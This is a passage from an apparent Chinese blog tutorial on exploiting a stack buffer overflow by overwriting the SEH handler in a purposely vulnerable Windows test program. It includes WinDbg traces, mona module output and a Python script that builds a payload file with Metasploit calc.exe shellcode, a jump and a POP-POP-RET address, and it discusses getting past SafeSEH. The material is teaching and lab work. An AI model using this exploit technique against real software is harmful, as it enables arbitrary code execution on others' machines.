eip&#61;<span class="hljs-number">74</span>beff99 esp&#61;<span class="hljs-number">0017f</span>728 ebp&#61;<span class="hljs-number">0017f</span>7a4 iopl&#61;<span class="hljs-number">0</span>         nv up ei pl zr na pe nc
cs&#61;<span class="hljs-number">0023</span>  ss&#61;<span class="hljs-number">002</span>b  ds&#61;<span class="hljs-number">002</span>b  es&#61;<span class="hljs-number">002</span>b  fs&#61;<span class="hljs-number">0053</span>  gs&#61;<span class="hljs-number">002</span>b             efl&#61;<span class="hljs-number">00000246</span>
kernel32!UnhandledExceptionFilter&#43;<span class="hljs-number">0x5f</span>:
<span class="hljs-number">74</span>beff99 cc              <span class="hljs-keyword">int</span>     <span class="hljs-number">3</span>
<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; k
ChildEBP RetAddr  
<span class="hljs-number">0017f</span>7a4 <span class="hljs-number">738100f</span>1 kernel32!UnhandledExceptionFilter&#43;<span class="hljs-number">0x5f</span>
<span class="hljs-number">0017f</span>7b0 <span class="hljs-number">012</span>a13c9 MSVCR110!__crtUnhandledException&#43;<span class="hljs-number">0x14</span>
<span class="hljs-number">0017f</span>7c0 <span class="hljs-number">012</span>a14e0 test_x86_wo_safeseh_dep!__raise_securityfailure&#43;<span class="hljs-number">0x1d</span> [f:\dd\vctools\crt_bld\self_x86\crt\src\gs_report.c &#64; <span class="hljs-number">79</span>]
<span class="hljs-number">0017f</span>af0 <span class="hljs-number">012</span>a1126 test_x86_wo_safeseh_dep!__report_gsfailure&#43;<span class="hljs-number">0xf7</span> [f:\dd\vctools\crt_bld\self_x86\crt\src\gs_report.c &#64; <span class="hljs-number">235</span>]
<span class="hljs-number">0017f</span>b20 <span class="hljs-number">61616161</span> test_x86_wo_safeseh_dep!main&#43;<span class="hljs-number">0x126</span> [z:\d_disk\workspace\vs_2012\test\stack_overflow.cpp &#64; <span class="hljs-number">30</span>]</code></pre> 
<p>原因是由于这次生成的msg.dat没有在stack security checking之前&#xff0c;触发异常。 <br /> 重新修改python脚本&#xff0c;如下&#xff1a;</p> 
<pre class="prettyprint"><code class=" hljs tex">import struct
output &#61; r&#39;msg.dat&#39;
<span class="hljs-special">#</span> ntdll.dll
ntdll &#61; 0x77320000   
<span class="hljs-special">#</span> windows/exec - 193 bytes
<span class="hljs-special">#</span> http://www.metasploit.com
<span class="hljs-special">#</span> VERBOSE&#61;false, PrependMigrate&#61;false, EXITFUNC&#61;process, 
<span class="hljs-special">#</span> CMD&#61;calc.exe
buf &#61;  &#34;&#34;
buf &#43;&#61; &#34;<span class="hljs-command">\xfc</span><span class="hljs-command">\xe</span>8<span class="hljs-command">\x</span>82<span class="hljs-command">\x</span>00<span class="hljs-command">\x</span>00<span class="hljs-command">\x</span>00<span class="hljs-command">\x</span>60<span class="hljs-command">\x</span>89<span class="hljs-command">\xe</span>5<span class="hljs-command">\x</span>31<span class="hljs-command">\xc</span>0<span class="hljs-command">\x</span>64<span class="hljs-command">\x</span>8b&#34;
buf &#43;&#61; &#34;<span class="hljs-command">\x</span>50<span class="hljs-command">\x</span>30<span class="hljs-command">\x</span>8b<span class="hljs-command">\x</span>52<span class="hljs-command">\x</span>0c<span class="hljs-command">\x</span>8b<span class="hljs-command">\x</span>52<span class="hljs-command">\x</span>14<span class="hljs-command">\x</span>8b<span class="hljs-command">\x</span>72<span class="hljs-command">\x</span>28<span class="hljs-command">\x</span>0f<span class="hljs-command">\xb</span>7&#34;
buf &#43;&#61; &#34;<span class="hljs-command">\x</span>4a<span class="hljs-command">\x</span>26<span class="hljs-command">\x</span>31<span class="hljs-command">\xff</span><span class="hljs-command">\xac</span><span class="hljs-command">\x</span>3c<span class="hljs-command">\x</span>61<span class="hljs-command">\x</span>7c<span class="hljs-command">\x</span>02<span class="hljs-command">\x</span>2c<span class="hljs-command">\x</span>20<span class="hljs-command">\xc</span>1<span class="hljs-command">\xcf</span>&#34;
buf &#43;&#61; &#34;<span class="hljs-command">\x</span>0d<span class="hljs-command">\x</span>01<span class="hljs-command">\xc</span>7<span class="hljs-command">\xe</span>2<span class="hljs-command">\xf</span>2<span class="hljs-command">\x</span>52<span class="hljs-command">\x</span>57<span class="hljs-command">\x</span>8b<span class="hljs-command">\x</span>52<span class="hljs-command">\x</span>10<span class="hljs-command">\x</span>8b<span class="hljs-command">\x</span>4a<span class="hljs-command">\x</span>3c&#34;
buf &#43;&#61; &#34;<span class="hljs-command">\x</span>8b<span class="hljs-command">\x</span>4c<span class="hljs-command">\x</span>11<span class="hljs-command">\x</span>78<span class="hljs-command">\xe</span>3<span class="hljs-command">\x</span>48<span class="hljs-command">\x</span>01<span class="hljs-command">\xd</span>1<span class="hljs-command">\x</span>51<span class="hljs-command">\x</span>8b<span class="hljs-command">\x</span>59<span class="hljs-command">\x</span>20<span class="hljs-command">\x</span>01&#34;
buf &#43;&#61; &#34;<span class="hljs-command">\xd</span>3<span class="hljs-command">\x</span>8b<span class="hljs-command">\x</span>49<span class="hljs-command">\x</span>18<span class="hljs-command">\xe</span>3<span class="hljs-command">\x</span>3a<span class="hljs-command">\x</span>49<span class="hljs-command">\x</span>8b<span class="hljs-command">\x</span>34<span class="hljs-command">\x</span>8b<span class="hljs-command">\x</span>01<span class="hljs-command">\xd</span>6<span class="hljs-command">\x</span>31&#34;
buf &#43;&#61; &#34;<span class="hljs-command">\xff</span><span class="hljs-command">\xac</span><span class="hljs-command">\xc</span>1<span class="hljs-command">\xcf</span><span class="hljs-command">\x</span>0d<span class="hljs-command">\x</span>01<span class="hljs-command">\xc</span>7<span class="hljs-command">\x</span>38<span class="hljs-command">\xe</span>0<span class="hljs-command">\x</span>75<span class="hljs-command">\xf</span>6<span class="hljs-command">\x</span>03<span class="hljs-command">\x</span>7d&#34;
buf &#43;&#61; &#34;<span class="hljs-command">\xf</span>8<span class="hljs-command">\x</span>3b<span class="hljs-command">\x</span>7d<span class="hljs-command">\x</span>24<span class="hljs-command">\x</span>75<span class="hljs-command">\xe</span>4<span class="hljs-command">\x</span>58<span class="hljs-command">\x</span>8b<span class="hljs-command">\x</span>58<span class="hljs-command">\x</span>24<span class="hljs-command">\x</span>01<span class="hljs-command">\xd</span>3<span class="hljs-command">\x</span>66&#34;
buf &#43;&#61; &#34;<span class="hljs-command">\x</span>8b<span class="hljs-command">\x</span>0c<span class="hljs-command">\x</span>4b<span class="hljs-command">\x</span>8b<span class="hljs-command">\x</span>58<span class="hljs-command">\x</span>1c<span class="hljs-command">\x</span>01<span class="hljs-command">\xd</span>3<span class="hljs-command">\x</span>8b<span class="hljs-command">\x</span>04<span class="hljs-command">\x</span>8b<span class="hljs-command">\x</span>01<span class="hljs-command">\xd</span>0&#34;
buf &#43;&#61; &#34;<span class="hljs-command">\x</span>89<span class="hljs-command">\x</span>44<span class="hljs-command">\x</span>24<span class="hljs-command">\x</span>24<span class="hljs-command">\x</span>5b<span class="hljs-command">\x</span>5b<span class="hljs-command">\x</span>61<span class="hljs-command">\x</span>59<span class="hljs-command">\x</span>5a<span class="hljs-command">\x</span>51<span class="hljs-command">\xff</span><span class="hljs-command">\xe</span>0<span class="hljs-command">\x</span>5f&#34;
buf &#43;&#61; &#34;<span class="hljs-command">\x</span>5f<span class="hljs-command">\x</span>5a<span class="hljs-command">\x</span>8b<span class="hljs-command">\x</span>12<span class="hljs-command">\xeb</span><span class="hljs-command">\x</span>8d<span class="hljs-command">\x</span>5d<span class="hljs-command">\x</span>6a<span class="hljs-command">\x</span>01<span class="hljs-command">\x</span>8d<span class="hljs-command">\x</span>85<span class="hljs-command">\xb</span>2<span class="hljs-command">\x</span>00&#34;
buf &#43;&#61; &#34;<span class="hljs-command">\x</span>00<span class="hljs-command">\x</span>00<span class="hljs-command">\x</span>50<span class="hljs-command">\x</span>68<span class="hljs-command">\x</span>31<span class="hljs-command">\x</span>8b<span class="hljs-command">\x</span>6f<span class="hljs-command">\x</span>87<span class="hljs-command">\xff</span><span class="hljs-command">\xd</span>5<span class="hljs-command">\xbb</span><span class="hljs-command">\xf</span>0<span class="hljs-command">\xb</span>5&#34;
buf &#43;&#61; &#34;<span class="hljs-command">\xa</span>2<span class="hljs-command">\x</span>56<span class="hljs-command">\x</span>68<span class="hljs-command">\xa</span>6<span class="hljs-command">\x</span>95<span class="hljs-command">\xbd</span><span class="hljs-command">\x</span>9d<span class="hljs-command">\xff</span><span class="hljs-command">\xd</span>5<span class="hljs-command">\x</span>3c<span class="hljs-command">\x</span>06<span class="hljs-command">\x</span>7c<span class="hljs-command">\x</span>0a&#34;
buf &#43;&#61; &#34;<span class="hljs-command">\x</span>80<span class="hljs-command">\xfb</span><span class="hljs-command">\xe</span>0<span class="hljs-command">\x</span>75<span class="hljs-command">\x</span>05<span class="hljs-command">\xbb</span><span class="hljs-command">\x</span>47<span class="hljs-command">\x</span>13<span class="hljs-command">\x</span>72<span class="hljs-command">\x</span>6f<span class="hljs-command">\x</span>6a<span class="hljs-command">\x</span>00<span class="hljs-command">\x</span>53&#34;
buf &#43;&#61; &#34;<span class="hljs-command">\xff</span><span class="hljs-command">\xd</span>5<span class="hljs-command">\x</span>63<span class="hljs-command">\x</span>61<span class="hljs-command">\x</span>6c<span class="hljs-command">\x</span>63<span class="hljs-command">\x</span>2e<span class="hljs-command">\x</span>65<span class="hljs-command">\x</span>78<span class="hljs-command">\x</span>65<span class="hljs-command">\x</span>00&#34;

with open(output, &#39;wb&#39;) as f:
    shellcode &#61; buf
    jmp_code &#61; &#34;<span class="hljs-command">\xeb</span><span class="hljs-command">\x</span>06<span class="hljs-command">\x</span>90<span class="hljs-command">\x</span>90&#34;
    addr_pop_pop_ret &#61; struct.pack(&#39;&lt;I&#39;, ntdll &#43; 0x3fd82)
    data &#61; &#39;a&#39;*84 &#43; jmp_code &#43; addr_pop_pop_ret &#43; shellcode
    f.write(data &#43; &#39;c&#39;*(10000-len(data)))</code></pre> 
<p>调试以后&#xff0c;发现依然会出现exception&#xff0c;而这个异常会在触发完第一个异常处理函数之后&#xff0c;在第二个异常处理之前产生。而此时&#xff0c;相应的exception handler已经被成功覆写。</p> 
<pre class="prettyprint"><code class=" hljs erlang-repl"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; <span class="hljs-exclamation_mark">!</span><span class="hljs-function_or_atom">exchain</span>
<span class="hljs-number">0046</span>f880: <span class="hljs-variable">MSVCR110</span><span class="hljs-exclamation_mark">!</span>_except_handler4&#43;<span class="hljs-number">0</span> (<span class="hljs-number">7378</span>a6e0)
  <span class="hljs-variable">CRT</span> <span class="hljs-function_or_atom">scope</span>  <span class="hljs-number">0</span>, <span class="hljs-function_or_atom">func</span>:   <span class="hljs-variable">MSVCR110</span><span class="hljs-exclamation_mark">!</span><span class="hljs-function_or_atom">fread_s</span>&#43;<span class="hljs-number">83</span> (<span class="hljs-number">737</span>c1cfc)
<span class="hljs-number">0046</span>f928: <span class="hljs-function_or_atom">ntdll</span><span class="hljs-exclamation_mark">!</span><span class="hljs-variable">RtlpCreateLowFragHeap</span>&#43;<span class="hljs-number">2</span>a (<span class="hljs-number">7735</span>fd82)
<span class="hljs-variable">Invalid</span> <span class="hljs-function_or_atom">exception</span> <span class="hljs-function_or_atom">stack</span> <span class="hljs-function_or_atom">at</span> <span class="hljs-function_or_atom">eb069090</span>
<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; <span class="hljs-function_or_atom">bp</span> <span class="hljs-number">7378</span>a6e0
<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; <span class="hljs-function_or_atom">bp</span> <span class="hljs-number">7735</span>fd82
<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; <span class="hljs-function_or_atom">g</span>
<span class="hljs-variable">Breakpoint</span> <span class="hljs-number">0</span> <span class="hljs-function_or_atom">hit</span>
<span class="hljs-function_or_atom">eax</span>&#61;<span class="hljs-number">00000000</span> <span class="hljs-function_or_atom">ebx</span>&#61;<span class="hljs-number">00000000</span> <span class="hljs-function_or_atom">ecx</span>&#61;<span class="hljs-number">7378</span>a6e0 <span class="hljs-function_or_atom">edx</span>&#61;<span class="hljs-number">7737</span>b46d <span class="hljs-function_or_atom">esi</span>&#61;<span class="hljs-number">00000000</span> <span class="hljs-function_or_atom">edi</span>&#61;<span class="hljs-number">00000000</span>
<span class="hljs-function_or_atom">eip</span>&#61;<span class="hljs-number">7378</span>a6e0 <span class="hljs-function_or_atom">esp</span>&#61;<span class="hljs-number">0046</span>f258 <span class="hljs-function_or_atom">ebp</span>&#61;<span class="hljs-number">0046</span>f278 <span class="hljs-function_or_atom">iopl</span>&#61;<span class="hljs-number">0</span>         <span class="hljs-function_or_atom">nv</span> <span class="hljs-function_or_atom">up</span> <span class="hljs-function_or_atom">ei</span> <span class="hljs-function_or_atom">pl</span> <span class="hljs-function_or_atom">zr</span> <span class="hljs-function_or_atom">na</span> <span class="hljs-function_or_atom">pe</span> <span class="hljs-function_or_atom">nc</span>
<span class="hljs-function_or_atom">cs</span>&#61;<span class="hljs-number">0023</span>  <span class="hljs-function_or_atom">ss</span>&#61;<span class="hljs-number">002</span>b  <span class="hljs-function_or_atom">ds</span>&#61;<span class="hljs-number">002</span>b  <span class="hljs-function_or_atom">es</span>&#61;<span class="hljs-number">002</span>b  <span class="hljs-function_or_atom">fs</span>&#61;<span class="hljs-number">0053</span>  <span class="hljs-function_or_atom">gs</span>&#61;<span class="hljs-number">002</span>b             <span class="hljs-function_or_atom">efl</span>&#61;<span class="hljs-number">00000246</span>
<span class="hljs-variable">MSVCR110</span><span class="hljs-exclamation_mark">!</span>_except_handler4:
<span class="hljs-number">7378</span>a6e0 <span class="hljs-number">55</span>              <span class="hljs-function_or_atom">push</span>    <span class="hljs-function_or_atom">ebp</span>
<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; <span class="hljs-function_or_atom">g</span>
(<span class="hljs-function_or_atom">af0</span>.<span class="hljs-function_or_atom">b80</span>): <span class="hljs-variable">Access</span> <span class="hljs-function_or_atom">violation</span> - <span class="hljs-function_or_atom">code</span> <span class="hljs-function_or_atom">c0000005</span> (<span class="hljs-exclamation_mark">!</span><span class="hljs-exclamation_mark">!</span><span class="hljs-exclamation_mark">!</span> <span class="hljs-function_or_atom">second</span> <span class="hljs-function_or_atom">chance</span> <span class="hljs-exclamation_mark">!</span><span class="hljs-exclamation_mark">!</span><span class="hljs-exclamation_mark">!</span>)
<span class="hljs-function_or_atom">eax</span>&#61;<span class="hljs-number">00000000</span> <span class="hljs-function_or_atom">ebx</span>&#61;<span class="hljs-number">0046</span>f340 <span class="hljs-function_or_atom">ecx</span>&#61;<span class="hljs-number">00000029</span> <span class="hljs-function_or_atom">edx</span>&#61;<span class="hljs-number">00000000</span> <span class="hljs-function_or_atom">esi</span>&#61;<span class="hljs-number">008</span>d85b4 <span class="hljs-function_or_atom">edi</span>&#61;<span class="hljs-number">00470000</span>
<span class="hljs-function_or_atom">eip</span>&#61;<span class="hljs-number">773415</span>de <span class="hljs-function_or_atom">esp</span>&#61;<span class="hljs-number">0046</span>f32c <span class="hljs-function_or_atom">ebp</span>&#61;<span class="hljs-number">0046</span>f814 <span class="hljs-function_or_atom">iopl</span>&#61;<span class="hljs-number">0</span>         <span class="hljs-function_or_atom">nv</span> <span class="hljs-function_or_atom">up</span> <span class="hljs-function_or_atom">ei</span> <span class="hljs-function_or_atom">pl</span> <span class="hljs-function_or_atom">zr</span> <span class="hljs-function_or_atom">na</span> <span class="hljs-function_or_atom">pe</span> <span class="hljs-function_or_atom">nc</span>
<span class="hljs-function_or_atom">cs</span>&#61;<span class="hljs-number">0023</span>  <span class="hljs-function_or_atom">ss</span>&#61;<span class="hljs-number">002</span>b  <span class="hljs-function_or_atom">ds</span>&#61;<span class="hljs-number">002</span>b  <span class="hljs-function_or_atom">es</span>&#61;<span class="hljs-number">002</span>b  <span class="hljs-function_or_atom">fs</span>&#61;<span class="hljs-number">0053</span>  <span class="hljs-function_or_atom">gs</span>&#61;<span class="hljs-number">002</span>b             <span class="hljs-function_or_atom">efl</span>&#61;<span class="hljs-number">00000246</span>
<span class="hljs-function_or_atom">ntdll</span><span class="hljs-exclamation_mark">!</span><span class="hljs-variable">NtRaiseException</span>&#43;<span class="hljs-number">0</span>x12:
<span class="hljs-number">773415</span>de <span class="hljs-number">83</span>c404          <span class="hljs-function_or_atom">add</span>     <span class="hljs-function_or_atom">esp</span>,<span class="hljs-number">4</span>
<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; <span class="hljs-function_or_atom">g</span>
(<span class="hljs-function_or_atom">af0</span>.<span class="hljs-function_or_atom">b80</span>): <span class="hljs-variable">Unknown</span> <span class="hljs-function_or_atom">exception</span> - <span class="hljs-function_or_atom">code</span> <span class="hljs-number">00000000</span> (<span class="hljs-function_or_atom">first</span> <span class="hljs-function_or_atom">chance</span>)
<span class="hljs-variable">Breakpoint</span> <span class="hljs-number">0</span> <span class="hljs-function_or_atom">hit</span>
<span class="hljs-function_or_atom">eax</span>&#61;<span class="hljs-number">00000000</span> <span class="hljs-function_or_atom">ebx</span>&#61;<span class="hljs-number">00000000</span> <span class="hljs-function_or_atom">ecx</span>&#61;<span class="hljs-number">7378</span>a6e0 <span class="hljs-function_or_atom">edx</span>&#61;<span class="hljs-number">7737</span>b46d <span class="hljs-function_or_atom">esi</span>&#61;<span class="hljs-number">00000000</span> <span class="hljs-function_or_atom">edi</span>&#61;<span class="hljs-number">00000000</span>
<span class="hljs-function_or_atom">eip</span>&#61;<span class="hljs-number">7378</span>a6e0 <span class="hljs-function_or_atom">esp</span>&#61;<span class="hljs-number">0046</span>ed90 <span class="hljs-function_or_atom">ebp</span>&#61;<span class="hljs-number">0046</span>edb0 <span class="hljs-function_or_atom">iopl</span>&#61;<span class="hljs-number">0</span>         <span class="hljs-function_or_atom">nv</span> <span class="hljs-function_or_atom">up</span> <span class="hljs-function_or_atom">ei</span> <span class="hljs-function_or_atom">pl</span> <span class="hljs-function_or_atom">zr</span> <span class="hljs-function_or_atom">na</span> <span class="hljs-function_or_atom">pe</span> <span class="hljs-function_or_atom">nc</span>
<span class="hljs-function_or_atom">cs</span>&#61;<span class="hljs-number">0023</span>  <span class="hljs-function_or_atom">ss</span>&#61;<span class="hljs-number">002</span>b  <span class="hljs-function_or_atom">ds</span>&#61;<span class="hljs-number">002</span>b  <span class="hljs-function_or_atom">es</span>&#61;<span class="hljs-number">002</span>b  <span class="hljs-function_or_atom">fs</span>&#61;<span class="hljs-number">0053</span>  <span class="hljs-function_or_atom">gs</span>&#61;<span class="hljs-number">002</span>b             <span class="hljs-function_or_atom">efl</span>&#61;<span class="hljs-number">00000246</span>
<span class="hljs-variable">MSVCR110</span><span class="hljs-exclamation_mark">!</span>_except_handler4:
<span class="hljs-number">7378</span>a6e0 <span class="hljs-number">55</span>              <span class="hljs-function_or_atom">push</span>    <span class="hljs-function_or_atom">ebp</span>
<span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; <span class="hljs-function_or_atom">g</span>
(<span class="hljs-function_or_atom">af0</span>.<span class="hljs-function_or_atom">b80</span>): <span class="hljs-variable">Unknown</span> <span class="hljs-function_or_atom">exception</span> - <span class="hljs-function_or_atom">code</span> <span class="hljs-number">00000000</span> (<span class="hljs-exclamation_mark">!</span><span class="hljs-exclamation_mark">!</span><span class="hljs-exclamation_mark">!</span> <span class="hljs-function_or_atom">second</span> <span class="hljs-function_or_atom">chance</span> <span class="hljs-exclamation_mark">!</span><span class="hljs-exclamation_mark">!</span><span class="hljs-exclamation_mark">!</span>)
<span class="hljs-function_or_atom">eax</span>&#61;<span class="hljs-number">00000000</span> <span class="hljs-function_or_atom">ebx</span>&#61;<span class="hljs-number">0046</span>ee78 <span class="hljs-function_or_atom">ecx</span>&#61;<span class="hljs-function_or_atom">d4840000</span> <span class="hljs-function_or_atom">edx</span>&#61;<span class="hljs-number">0028</span>dde8 <span class="hljs-function_or_atom">esi</span>&#61;<span class="hljs-number">008</span>d85b4 <span class="hljs-function_or_atom">edi</span>&#61;<span class="hljs-number">00470000</span>
<span class="hljs-function_or_atom">eip</span>&#61;<span class="hljs-number">773415</span>de <span class="hljs-function_or_atom">esp</span>&#61;<span class="hljs-number">0046</span>ee64 <span class="hljs-function_or_atom">ebp</span>&#61;<span class="hljs-number">0046</span>f814 <span class="hljs-function_or_atom">iopl</span>&#61;<span class="hljs-number">0</span>         <span class="hljs-function_or_atom">nv</span> <span class="hljs-function_or_atom">up</span> <span class="hljs-function_or_atom">ei</span> <span class="hljs-function_or_atom">pl</span> <span class="hljs-function_or_atom">zr</span> <span class="hljs-function_or_atom">na</span> <span class="hljs-function_or_atom">pe</span> <span class="hljs-function_or_atom">nc</span>
<span class="hljs-function_or_atom">cs</span>&#61;<span class="hljs-number">0023</span>  <span class="hljs-function_or_atom">ss</span>&#61;<span class="hljs-number">002</span>b  <span class="hljs-function_or_atom">ds</span>&#61;<span class="hljs-number">002</span>b  <span class="hljs-function_or_atom">es</span>&#61;<span class="hljs-number">002</span>b  <span class="hljs-function_or_atom">fs</span>&#61;<span class="hljs-number">0053</span>  <span class="hljs-function_or_atom">gs</span>&#61;<span class="hljs-number">002</span>b             <span class="hljs-function_or_atom">efl</span>&#61;<span class="hljs-number">00000246</span>
<span class="hljs-function_or_atom">ntdll</span><span class="hljs-exclamation_mark">!</span><span class="hljs-variable">NtRaiseException</span>&#43;<span class="hljs-number">0</span>x12:
<span class="hljs-number">773415</span>de <span class="hljs-number">83</span>c404          <span class="hljs-function_or_atom">add</span>     <span class="hljs-function_or_atom">esp</span>,<span class="hljs-number">4</span></code></pre> 
<p>这种情况的原因是由于我们使用的POP,POP,RET是NTDLL中的地址&#xff0c;而NTDLL已经开启了SAFESEH&#xff0c;从而导致&#xff0c;我们覆写的exception handler会触发异常。</p> 
<pre class="prettyprint"><code class=" hljs mathematica"><span class="hljs-number">0</span>:<span class="hljs-number">000</span>&gt; !py mona modules
<span class="hljs-keyword">Module</span> info :
----------------------------------------------------------------------------------------------------------------------------------
 Base       | <span class="hljs-keyword">Top</span>        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | <span class="hljs-keyword">Version</span>, Modulename &amp; <span class="hljs-keyword">Path</span>
----------------------------------------------------------------------------------------------------------------------------------
 <span class="hljs-number">0x75500000</span> | <span class="hljs-number">0x75546000</span> | <span class="hljs-number">0x00046000</span> | <span class="hljs-keyword">False</span>  | <span class="hljs-keyword">True</span>    | <span class="hljs-keyword">True</span>  |  <span class="hljs-keyword">True</span>    | <span class="hljs-keyword">True</span>   | <span class="hljs-number">6.1</span><span class="hljs-number">.7601</span><span class="hljs-number">.17651</span> [KERNELBASE.dll] (<span class="hljs-keyword">C</span>:\Windows\syswow64\KERNELBASE.dll)
 <span class="hljs-number">0x77320000</span> | <span class="hljs-number">0x774a0000</span> | <span class="hljs-number">0x00180000</span> | <span class="hljs-keyword">False</span>  | <span class="hljs-keyword">True</span>    | <span class="hljs-keyword">True</span>  |  <span class="hljs-keyword">True</span>    | <span class="hljs-keyword">True</span>   | <span class="hljs-number">6.1</span><span class="hljs-number">.7601</span><span class="hljs-number">.17725</span> [ntdll.dll] (ntdll.dll)
 <span class="hljs-number">0x74ba0000</span> | <span class="hljs-number">0x74cb0000</span> | <span class="hljs-number">0x00110000</span> | <span class="hljs-keyword">False</span>  | <span class="hljs-keyword">True</span>    | <span class="hljs-keyword">True</span>  |  <span class="hljs-keyword">True</span>    | <span class="hljs-keyword">True</span>   | <span class="hljs-number">6.1</span><span class="hljs-number">.7601</span><span class="hljs-number">.17651</span> [kernel32.dll] (<span class="hljs-keyword">C</span>:\Windows\syswow64\kernel32.dll)
 <span class="hljs-number">0x00010000</span> | <span class="hljs-number">0x00016000</span> | <span class="hljs-number">0x00006000</span> | <span class="hljs-keyword">False</span>  | <span class="hljs-keyword">False</span>   | <span class="hljs-keyword">True</span>  |  <span class="hljs-keyword">False</span>   | <span class="hljs-keyword">False</span>  | -<span class="hljs-number">1.0</span>- [test_x86_wo_safeseh_dep.exe] (test_x86_wo_safeseh_dep.exe)
 <span class="hljs-number">0x73770000</span> | <span class="hljs-number">0x73846000</span> | <span class="hljs-number">0x000d6000</span> | <span class="hljs-keyword">False</span>  | <span class="hljs-keyword">True</span>    | <span class="hljs-keyword">True</span>  |  <span class="hljs-keyword">True</span>    | <span class="hljs-keyword">True</span>   | <span class="hljs-number">11.0</span><span class="hljs-number">.51106</span><span class="hljs-number">.1</span> [MSVCR110.dll] (<span class="hljs-keyword">C</span>:\Windows\SysWOW64\MSVCR110.dll)
----------------------------------------------------------------------------------------------------------------------------------</code></pre> 
<p>绕过SAFESEH&#xff0c;最简单的方式&#xff0c;就是找一个没有开启SAFESEH的module&#xff0c;从中寻找相应的指令。因为前面我们禁用了可执行程序的/SAFESEH&#xff0c;另外&#xff0c;由于当前的程序开启了ASLR&#xff0c;所以&#xff0c;程序每次启动都会改变基址&#xff0c;这样&#xff0c;我们准备的msg.dat就会失效&#xff0c;所以&#xff0c;为了简单说明问题&#xff0c;程序启动之初&#xff0c;在加载msg.dat之前&#xff0c;我们先查看相应的基址&#xff0c;并修改相应的脚本生成适当的msg.dat。关于绕过ASLR的方式&#xff0c;后续我们会在其他篇幅单独介绍。 <br /> <img src="https://img-blog.csdn.net/20161218231541065?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZHVwZWk&#61;/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA&#61;&#61;/dissolve/70/gravity/SouthEast" alt="弹出计算器" title="" /></p>
                </div>
                <link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/editerView/markdown_views-d7a94ec6ab.css" rel="stylesheet">
                <link href="https://csdnimg.cn/release/blogv2/dist/mdeditor/css/style-f1c5feb645.css" rel="stylesheet">
        </div>
    </article>
</div>
            <div id="csdn-shop-window" class="csdn-shop-window-common"></div>
<div class="more-toolbox" id="toolBarBox">
    <span id="fixedBar"></span>
    <div class="left-toolbox">
        <ul class="toolbox-list">
            <li class="tool-item tool-item-size tool-active is-like" id="is-like"><a>
            <img style="display:none;" id="is-like-imgactive-animation-like" class="animation-dom active-animation" src="https://csdnimg.cn/release/blogv2/dist/pc/img/tobarThumbUpactive.png" alt="">
            <img class="isactive" style="display:none" id="is-like-imgactive" src="https://csdnimg.cn/release/blogv2/dist/pc/img/tobarThumbUpactive.png" alt="">
            <img class="isdefault" style="display:block" id="is-like-img" src="https://csdnimg.cn/release/blogv2/dist/pc/img/tobarThumbUp.png" alt="">   
            <span class="name" id="is-like-span">点赞</span>
            <span id="spanCount" class="count">
                    1
            </span>
            </a></li>
            <li class="tool-item tool-item-size tool-active tool-item-comment">
                <a href="#commentBox">
                    <img class="isdefault" src="https://csdnimg.cn/release/blogv2/dist/pc/img/tobarComment.png" alt="">
                    <img class="isactive" src="https://csdnimg.cn/release/blogv2/dist/pc/img/tobarCommentactive.png" style="display:none;" alt="">
                    <span class="name">评论</span>
                    <span class="count">
                    </span>
                </a>
            </li>
            <li class="tool-item tool-item-size tool-active tool-QRcode" id="tool-share">
                <a href="javascript:;" data-report-click='{"mod":"1582594662_002","spm":"1001.2101.3001.4129","ab":"new"}'>
                    <img class="isdefault" src="https://csdnimg.cn/release/blogv2/dist/pc/img/tobarShare.png" alt="">
                    <img class="isactive" src="https://csdnimg.cn/release/blogv2/dist/pc/img/tobarShareactive.png" style="display:none;" alt="">
                    <span class="name">分享</span>
                </a>
                <div class="QRcode" id="tool-QRcode" style="left:-92%;">
                    <span id="QRcode-close">x</span>
                    <p class="title">
                    海报分享
                    </p>
                    <div id='shareCode'></div>
                    <p>
                    扫一扫，分享海报
                    </p>
                </div>
            </li>
            <li class="tool-item tool-item-size tool-active is-collection ">
                <a href="javascript:;" data-report-click='{"mod":"popu_824","spm":"1001.2101.3001.4130","ab":"new"}'>
                    <img style="display:none" id="is-collection-img-collection" class="animation-dom active-animation" src="https://csdnimg.cn/release/blogv2/dist/pc/img/tobarCollectionActive.png" alt="">
                    <img class="isdefault" id="is-collection-img" style="display:block" src="https://csdnimg.cn/release/blogv2/dist/pc/img/tobarCollect.png" alt="">
                    <img class="isactive" id="is-collection-imgactive" style="display:none" src="https://csdnimg.cn/release/blogv2/dist/pc/img/tobarCollectionActive.png" alt="">
                    <span class="name" id="is-collection">收藏</span>
                    <span class="count get-collection" id="get-collection">
                    </span>
                </a>
            </li>
            <li class="tool-item tool-item-size tool-active tool-reward">
                <a  id="toolreward" data-report-click='{"mod":"popu_830","spm":"1001.2101.3001.4237","dest":"","ab":"new"}'>
                    <img class="isdefault" src="https://csdnimg.cn/release/blogv2/dist/pc/img/tobarReward.png" alt="">
                    <img class="isactive" src="https://csdnimg.cn/release/blogv2/dist/pc/img/tobarRewardactive.png" style="display:none;" alt="">
                    <span class="name">打赏</span>
                </a>
<div id="reward" class="reward-box">
	<p class="rewad-title">打赏<span class="reward-close"><svg t="1567152543821" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="10924" xmlns:xlink="http://www.w3.org/1999/xlink" width="12" height="12"><defs><style type="text/css"></style></defs><path d="M512 438.378667L806.506667 143.893333a52.032 52.032 0 1 1 73.6 73.621334L585.621333 512l294.485334 294.485333a52.074667 52.074667 0 0 1-73.6 73.642667L512 585.621333 217.514667 880.128a52.053333 52.053333 0 1 1-73.621334-73.642667L438.378667 512 143.893333 217.514667a52.053333 52.053333 0 1 1 73.621334-73.621334L512 438.378667z" fill="" p-id="10925"></path></svg></span></p>
	<dl>
		<dd>
		<a href="https://blog.csdn.net/dupei" data-report-click='{"mod":"popu_379","dest":"https://blog.csdn.net/dupei","ab":"new"}'>
